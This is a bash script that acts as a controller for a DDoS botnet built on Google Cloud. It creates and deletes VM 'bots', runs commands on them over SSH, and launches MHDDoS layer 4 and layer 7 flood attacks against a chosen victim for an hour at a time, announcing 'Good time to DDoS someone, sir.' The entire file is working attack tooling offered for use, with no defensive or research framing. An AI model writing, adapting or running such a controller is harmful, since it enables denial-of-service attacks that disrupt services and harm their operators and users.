#!/bin/bash

usage()
{
	local w=25
	local fmt="\t%-${w}s %s\n"
	printf "Usage: $0 [options...]\n"
	printf "$fmt" "-a, --all" "Run action on each bot in the botnet."
	printf "$fmt" "-n, --num <num>" "Run action on num random bots."
	printf "$fmt" "-b, --bot <botname>" "Run action on specified bot."
	printf "$fmt" "-B, --botnet <botnet>" "Specify botnet to act on."
	printf "$fmt" "-d, --delete" "Delete specified bots."
	printf "$fmt" "-c, --create" "Create some bots."
	printf "$fmt" "-r, -C, --command <cmd>" "Command to run on each bot."
	printf "$fmt" "--attack <Layer:attack>" "Run this MHDDoS attack on bots"
	printf "$fmt" "--victim <victim_spec>" "Victim specification, like in MHDDoS"
	printf "$fmt" "-l, --list" "List bots in selected botnet."
	printf "$fmt" "--async" "Launch things asynchronously."
	printf "$fmt" "-t,--no-tty" "Don't allocate pty device"
	printf "$fmt" "-u, --user <user>" "Run command on bot under the user."
	printf "$fmt" "-S, --ssh-key-file <file>" "Connect to bot with this ssh key file."
	printf "$fmt" "-z, --zone <zone>" "(With -c only) Create bots in this zone"
	printf "$fmt" "-Z, --zone-file <file>" "(With -c only) Create bots in zones, specified in the file."
	printf "\n"
	printf "$fmt" "-v, --verbose" "Make output more verbose."
	printf "$fmt" "-q, --quiet" "Be more quiet."
}

token_quote()
{
  local quoted=()
  for token; do
    quoted+=( "$(printf '%q' "$token")" )
  done
  printf '%s\n' "${quoted[*]}"
}


die()
{
	printf "$@"
	exit 1
}

msg()
{
	[ "$VERB" -ne 0 ] && printf "$@" || (exit 1)
}

debug()
{
	printf "[DEBUG] " >&2
	printf "$@" >&2
}

warn()
{
	printf "[WARNING] " >&2
	printf "$@" >&2
}

noterm() {
    nohup "$@"  </dev/null &>/dev/null &
    disown %nohup
}

rand_str()
{
	local length=${1:?"No length specified in call to rand_str()"}
	tr -dc "a-z0-9" </dev/urandom | head -c "$length"
}

rand_zone()
{
	[ -n "$ZONE_FILE" -a -s "$ZONE_FILE" ] ||
		gcloud compute zones list --format='value(name)' > zones.txt
	shuf -n1 < "$ZONE_FILE"
}

init()
{
	:
}



get_bot_zone()
{
	: "${1:?No bot specified in call to get_bot_zone}"
	gcloud compute instances list --format="value(name,zone)" |
		grep -m1 "$1" |
		awk '{print $2}'
}

get_botnet_hosts()
{
	: "${1:?No botnet specified in call to get_botnet_hosts}"
		# get list of botnet hosts
	gcloud compute instances list --format="value(name)" -q 2>/dev/null |
		grep -e "-$1-"
}

create_bot()
{
	local botname
	local botid
	local zone
	: "${BOTNET_ID:=$(rand_str 3)}"
	for ((i=1; i<=NUM_BOTS; i++)); do
		debug "Creating bot #$i\n"
		[ -n "$BOT" -a "$NUM_BOTS" == 1 ] && botid="$BOT" || botid=$(rand_str 4)
		botname="bot-$BOTNET_ID-$botid"
		for ((tries=0; tries<10; tries++)); do
			[ -n "$ZONE" ] && zone="$ZONE" || zone="$(rand_zone)"
			gcloud compute instances create "$botname" \
		 		   --source-instance-template bot --zone "$zone" \
				   --quiet &>/dev/null && break
		done || die "Can't create bot for some reason(Probably bad zone or limit exceeded)\n"

		for ((tries=0; tries<5; tries++)); do
			sleep 1
			gcloud compute scp --zone "$zone" -q \
				   $SSH_KEY_FILE \
				   ./bot_init.sh "$botname":$HOME &>/dev/null && break
		done ||
			{
				# half-initialized bots isn't needed anymore
				remove_bot_impl "$botname"
				die "Can't transfer bot init script to bot\n"
			}
#		set -x
		debug "Running command on bot $botname in zone $zone...\n"
		if [ -n "$ASYNC" ]; then
			noterm gcloud compute ssh -q --zone "$zone" $SSH_KEY_FILE --command "${COMMAND:-./bot_init.sh}" "$USR"@"$botname" -- $TTY
		else
			gcloud compute ssh -q --zone "$zone" $SSH_KEY_FILE --command "${COMMAND:-./bot_init.sh}" "$USR"@"$botname" -- $TTY >/dev/null
		fi
#		run_bot_impl $botname "${COMMAND:-./bot_init.sh}" >/dev/null
	done
	
}

action_on_bot()
{
	local action="${1:?No action supplied in action_on_bot}"
	if [ "$NUM_BOTS" == all ]; then
		[ -z "$BOTNET_ID" ] && die "No botnet specified, so can't act on it\n"
		for bot in $(get_botnet_hosts "$BOTNET_ID"); do
			$action "$bot" "$2"
		done
	elif [ -n "$NUM_BOTS" -a -z "$BOT" ]; then
		[ -z "$BOTNET_ID" ] && die "No botnet specified, so can't act on it\n"
		for bot in $(get_botnet_hosts "$BOTNET_ID" | shuf -n "$NUM_BOTS"); do
			$action $bot "$2"
		done
	else
		[ -z "$BOT" ] && die "No bot specified, so can't act on it\n"
		$action "$BOT" "$2"
	fi
}

remove_bot_impl()
{
	: "${1:?No bot is specified in call to remove_bot_impl}"
	zone="$(get_bot_zone "$1")"
	debug "Removing bot $1 in zone $zone...\n"
	if [ -n "$ASYNC" ]; then
		noterm sh -c "yes | gcloud compute instances delete --zone '$zone' '$1'" 2>/dev/null
	else
		yes | gcloud compute instances delete --zone "$zone" "$1" -q &>/dev/null
	fi
}

delete_bot()
{
	action_on_bot "remove_bot_impl"
}

run_bot_impl()
{
	: "${1:?No bot is specified in call to run_bot_impl}"
	: "${2:?No command is specified to run on bot}"
	zone="$(get_bot_zone "$1")"
	debug "Running command on bot $1 in zone $zone...\n"
	if [ -n "$ASYNC" ]; then
		gcloud compute ssh -q --zone "$zone" $SSH_KEY_FILE --command "bash -lic 'noterm sh -c \"$2\"'" "$USR"@"$1" -- $TTY
	else
		gcloud compute ssh -q --zone "$zone" $SSH_KEY_FILE --command "bash -lic '$2'" "$USR"@"$1" -- $TTY
	fi
}

run_bot()
{
	[ "$VERB" -eq 0 ] && exec >/dev/null 2>&1
#	set -x
	action_on_bot "run_bot_impl" "$COMMAND"
}

list_bot_impl()
{
	local w=15
	zone="$(get_bot_zone "$1")"
	msg "%-${w}s : %s\n" "$1" "$zone" ||
		printf "%s\n" "$1"
}

list_bot()
{
	[ -n "$BOTNET_ID" -a "$VERB" -ne 0 ] &&
		msg "Listing hosts of botnet $BOTNET_ID...\n"
	action_on_bot "list_bot_impl"
}

attack_bot()
{
	[ -z "$ATTACK_ID" -o -z "$ATTACK_LAYER" ] && die "Bad attack specification.\n"
	[ -z "$ATTACK_VICTIM" -a "$ATTACK_LAYER" != stop ] && die "No victim is specified."
	debug "ATTACK_ID      = $ATTACK_ID\n"
	debug "ATTACK_LAYER   = $ATTACK_LAYER\n"
	debug "ATTACK_THREADS = $ATTACK_THREADS\n"
	debug "ATTACK_VICTIM  = $ATTACK_VICTIM\n"
	local script_path="/root/.local/bin/MHDDoS"

	case "$ATTACK_LAYER" in
		(stop) action_on_bot "run_bot_impl" "pkill python3"
			   ;;
		(L7) action_on_bot "run_bot_impl" \
						   "$script_path $ATTACK_ID $ATTACK_VICTIM 0 $ATTACK_THREADS /dev/null 100 3600"
			 ;;
		(L4) action_on_bot "run_bot_impl" \
						   "$script_path $ATTACK_ID $ATTACK_VICTIM $ATTACK_THREADS 3600"
			 ;;
		(multi) die "Unimplemented attack layer $ATTACK_LAYER\n"
				;;
		(*) die "Unrecognized attack layer '$ATTACK_LAYER'\n"
			;;
	esac
}


SSH_KEY_FILE=
ACTION=
ATTACK_ID=
ATTACK_LAYER=
ATTACK_THREADS=60
ATTACK_VICTIM=
NUM_BOTS=
BOT=
BOTNET_ID=
VERB=1
COMMAND=
ASYNC=
ZONE=
ZONE_FILE="zones.txt"
USR="$USER"
TTY=-t
while [ "$#" -gt 0 ]; do
	case "$1" in
		(-a|--all) NUM_BOTS=all
				   ;;
		(-n|--num) shift
				   NUM_BOTS="$1"
				   ;;
		(-d|--delete|--remove) ACTION=delete
							   ;;
		(-c|--create) ACTION=create
					  ;;
		(-b|--bot) shift
				   BOT="$1"
				   ;;
		(-r|-C|--command) shift
						  COMMAND="$1"
						  [ -z "$ACTION" ] && ACTION=run
						  USR=root
						  ;;
		(-l|--list) ACTION=list
					;;
		(-u|--user) shift
					USR="$1"
					;;
		(-S|--ssh-key-file) shift
							SSH_KEY_FILE="--ssh-key-file \"$1\""
							;;
		(--attack) shift
				   ACTION=attack
				   ATTACK_LAYER="${1%:*}"
				   ATTACK_ID="${1#*:}"
				   USR=root
				   ;;
		(-V|--victim) shift
					  ATTACK_VICTIM="$1"
					  ;;
		(-t|--no-tty) TTY=""
				   ;;
		(-T|--threads) shift
					   ATTACK_THREADS="$1"
					   ;;
		(-v|--verbose) VERB=2
					   ;;
		(-q|--quiet) VERB=0
					 ;;
		(-B|--botnet-id|--botnet) shift
		                          BOTNET_ID="$1"
								  ;;
		(-h|--help) usage
					exit 0
					;;
		(--async) ASYNC='&'
				  ;;
		(-z|--zone) shift
					ZONE="$1"
					;;
		(-Z|--zone-file) shift
						 ZONE_FILE="$1"
						 ;;
		(--) break
			 ;;
		(*) usage
			exit 1
			;;
	esac
	shift
done

case "$VERB" in
	# (0) exec &>/dev/null
	# 	;;
	(1) exec 2>/dev/null
		;;
esac

# sanity check
{
	[ -z "$NUM_BOTS" -a -z "$BOT" ] && die "No bots specified\n"
}

# some preparations
init

if [ "$ACTION" == create ]; then
	msg "Starting to create a botnet...\n"
	create_bot
	msg "Botnet created!\n"
	msg "Use botnet id '$BOTNET_ID' later\n" 
elif [ "$ACTION" == delete ]; then
	msg "It's over... Destroying botnet!\n"
	delete_bot
	msg "Botnet is successfully destroyed.\n"
elif [ "$ACTION" == run ]; then
	run_bot
elif [ "$ACTION" == list ]; then
	list_bot
elif [ "$ACTION" == attack ]; then
	msg "Good time to DDoS someone, sir.\n"
	attack_bot
else
	die "Unrecognized action $ACTION\n"
fi


exit 0
